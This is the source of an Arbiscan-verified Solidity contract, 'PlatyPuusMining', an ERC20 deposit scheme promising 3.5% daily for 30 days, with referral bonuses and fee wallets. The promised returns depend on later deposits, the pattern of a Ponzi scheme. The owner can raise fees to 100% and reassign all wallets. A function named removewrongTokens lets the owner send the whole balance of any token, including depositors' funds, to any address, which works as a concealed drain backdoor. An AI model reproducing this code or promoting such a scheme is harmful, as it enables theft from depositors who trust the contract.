/**
 *Submitted for verification at Arbiscan.io on 2024-06-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract PlatyPuusMining {

    IERC20 public Token;

    uint256 constant public INVEST_MIN_AMOUNT = 100 ether;
    uint256 public REFERRAL_PERCENTS = 1;
    uint256 constant public TOTAL_REF = 1;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 constant public TIME_STEP = 1 days;

    uint256 public totalInvested;

    uint256 public projectFee;
    uint256 public devFee;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint256 amount;
        uint256 start;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256[1] levels;
        uint256 bonus;
        uint256 totalBonus;
        uint256 withdrawn;
        mapping(address => address[]) refdet;
    }

    mapping(address => User) public users;

    uint256 public startDate;

    bool public pause;

    address public MarketingWallet;
    address public TreasuryWallet;
    address public devWallet;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);
    event FeesUpdated(uint256 newProjectFee, uint256 newDevFee);

    constructor(address MarketingAddr, address TreasuryAddr, address devAddr, uint256 start, IERC20 _Token, uint256 _projectFee, uint256 _devFee) {
        require(!isContract(MarketingAddr) && !isContract(TreasuryAddr) && !isContract(devAddr));
        MarketingWallet = MarketingAddr;
        TreasuryWallet = TreasuryAddr;
        devWallet = devAddr;
        Token = _Token;

        if(start > 0){
            startDate = start;
        } else {
            startDate = block.timestamp;
        }
        
        // Initialize fees
        projectFee = _projectFee;
        devFee = _devFee;

        plans.push(Plan(30, 35));
    }

    modifier onlyOwner {
        require(msg.sender == devWallet, "only owner");
        _;
    }

    function changeOwner(address _MarketingAddress, address _TreasuryAddress, address _devAddress) public onlyOwner {
        MarketingWallet = _MarketingAddress;
        TreasuryWallet = _TreasuryAddress;
        devWallet = _devAddress;
    }

    function setPause(bool _value) public onlyOwner {
        pause = _value;
    }

    function updateFees(uint256 _projectFee, uint256 _devFee) external onlyOwner {
        require(_projectFee + _devFee <= PERCENTS_DIVIDER, "Total fee is too high");
        projectFee = _projectFee;
        devFee = _devFee;
        emit FeesUpdated(_projectFee, _devFee);
    }

    function invest(address referrer, uint8 plan, uint256 investamount, address[] memory uplinead) public {
        require(!pause, "Contract is paused");
        require(block.timestamp > startDate, "contract does not launch yet");
        require(investamount >= INVEST_MIN_AMOUNT, "Minimum investment amount not met");
        require(plan < plans.length, "Invalid plan");

        uint256 pFee = investamount * projectFee / PERCENTS_DIVIDER / 2;
        uint256 dFee = investamount * devFee / PERCENTS_DIVIDER;
        Token.transferFrom(msg.sender, address(this), investamount);
        Token.transfer(MarketingWallet, pFee);
        Token.transfer(TreasuryWallet, pFee);
        Token.transfer(devWallet, dFee);
        emit FeePayed(msg.sender, pFee *2 + dFee );

        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address upline = user.referrer;
            for (uint256 i = 0; i < 1; i++) {
                if (upline != address(0)) {
                    users[upline].levels[i]++;
                    upline = users[upline].referrer;
                } else break;
            }
        }

        for(uint256 i = 0; i < uplinead.length; i++){
            if(uplinead.length == 1){
                require(uplinead[0] == getUserReferrer(msg.sender), "you are not the referrer");
            }
            if(i > 0){
                require(uplinead[i] == getUserReferrer(uplinead[i-1]), "you are not the referrer");
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint256 i = 0; i < 1; i++) {
                if (upline != address(0)) {
                    uint256 amount = investamount * REFERRAL_PERCENTS / PERCENTS_DIVIDER;
                    users[upline].bonus += amount;
                    users[upline].totalBonus += amount;
                    emit RefBonus(upline, msg.sender, i, amount);
                    upline = users[upline].referrer;
                }
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(plan, investamount, block.timestamp));
        totalInvested += investamount;

        if(user.referrer == devWallet || user.referrer == address(0) || uplinead.length == 0){
            Token.transfer(devWallet, investamount / 1000);
        } else {
            Token.transfer(uplinead[0], investamount / 1000);
        }

        emit NewDeposit(msg.sender, plan, investamount, block.timestamp);
    }

    function getLevel(address _address) public view returns(uint256) {
        User storage user = users[_address];
        address referrer = user.referrer;
        uint256 count;
        uint256[1] memory refcount = getUserDownlineCount(referrer);
        for(uint256 i = 0; i < 1; i++){
            count += refcount[i];
        }
        return count;
    }

    function withdraw() public {
        User storage user = users[msg.sender];
        uint256 totalAmount = getUserDividends(msg.sender);

        uint256 referralBonus = getUserReferralBonus(msg.sender);
        if (referralBonus > 0) {
            user.bonus = 0;
            totalAmount += referralBonus;
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance = Token.balanceOf(address(this));
        if (contractBalance < totalAmount) {
            user.bonus = totalAmount - contractBalance;
            totalAmount = contractBalance;
        }

        user.checkpoint = block.timestamp;
        user.withdrawn += totalAmount;
        Token.transfer(msg.sender, totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }

    function getContractBalance() public view returns (uint256) {
        return Token.balanceOf(address(this));
    }

    function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getUserDividends(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        uint256 totalAmount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            uint256 finish = user.deposits[i].start + plans[user.deposits[i].plan].time * TIME_STEP;
            if (user.checkpoint < finish) {
                uint256 share = user.deposits[i].amount * plans[user.deposits[i].plan].percent / PERCENTS_DIVIDER;
                uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
                uint256 to = finish < block.timestamp ? finish : block.timestamp;
                if (from < to) {
                    totalAmount += share * (to - from) / TIME_STEP;
                }
            }
        }
        return totalAmount;
    }

function removewrongTokens(address tokenAddr, address to) external onlyOwner {
        IERC20 token = IERC20(tokenAddr);
        token.transfer(to, token.balanceOf(address(this)));
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
        return users[userAddress].withdrawn;
    }

    function getUserCheckpoint(address userAddress) public view returns(uint256) {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns(uint256[1] memory referrals) {
        return users[userAddress].levels;
    }

    function getUserTotalReferrals(address userAddress) public view returns(uint256) {
        return users[userAddress].levels[0];
    }

    function getUserReferralBonus(address userAddress) public view returns(uint256) {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
        return users[userAddress].totalBonus - users[userAddress].bonus;
    }

    function getUserAvailable(address userAddress) public view returns(uint256) {
        return getUserReferralBonus(userAddress) + getUserDividends(userAddress);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount += users[userAddress].deposits[i].amount;
        }
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
        User storage user = users[userAddress];
        plan = user.deposits[index].plan;
        percent = plans[plan].percent;
        amount = user.deposits[index].amount;
        start = user.deposits[index].start;
        finish = user.deposits[index].start + plans[user.deposits[index].plan].time * TIME_STEP;
    }

    function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalBonus) {
        return (totalInvested, totalInvested * TOTAL_REF / PERCENTS_DIVIDER);
    }

    function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
        return (getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}